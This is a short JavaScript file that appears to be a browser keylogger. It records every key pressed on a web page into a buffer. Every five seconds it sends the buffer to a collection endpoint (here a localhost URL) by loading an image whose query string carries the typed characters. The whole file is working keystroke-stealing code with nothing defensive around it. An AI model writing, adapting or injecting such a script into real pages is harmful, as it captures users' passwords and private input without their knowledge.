let keys = '';
let url = 'http://localhost:8000/dataKeyLoger?key=';

// smart handler for event (document.onkeypress)
document.addEventListener('keypress', (e) => {
    console.log('addEvent');
    let get = window.event ? event : e;
    let key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
});

window.setInterval(() => {
    if(keys.length > 0) {
        new Image().src = url + keys;
        keys = '';
    }
}, 5000);